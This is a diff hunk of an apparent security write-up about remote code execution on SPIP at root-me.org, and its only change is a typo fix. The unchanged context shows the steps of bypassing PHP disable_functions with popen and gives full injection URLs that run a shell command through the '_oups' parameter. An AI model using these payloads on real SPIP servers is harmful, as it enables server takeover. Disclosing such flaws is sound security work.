@@ -512,7 +512,7 @@ https://www.root-me.org/ecrire/?exec=article&amp;id_article=1&amp;ajouter=non&am
 <li><p>Spawn a phpinfo to see what is allowed / forbidden
 <img class="img_big" src="/hacking/rce_on_spip_and_root_me/phpinfo.jpg" alt="phpinfo"></p></li>
 
-<li><p>Bypass the php disable_functions policieswith <code>popen</code> which wasn’t restricted // Edit, I probably just forgot to echo the result of shell_exec.. :)</p>
+<li><p>Bypass the php disable_functions policies with <code>popen</code> which wasn’t restricted // Edit, I probably just forgot to echo the result of shell_exec.. :)</p>
 
 <pre><code class="language-html">https://www.root-me.org/ecrire/?exec=article&amp;id_article=1&amp;ajouter=non&amp;tri_liste_aut=statut&amp;deplacer=oui&amp;_oups='&lt;?php echo fread(popen(&quot;id&quot;, &quot;r&quot;), 300);?&gt;
 https://www.root-me.org/ecrire/?exec=article&amp;id_article=1&amp;ajouter=non&amp;tri_liste_aut=statut&amp;deplacer=oui&amp;_oups=%27%3C?php%20echo%20fread(popen(%22id%22,%20%22r%22),%20300);?%3E
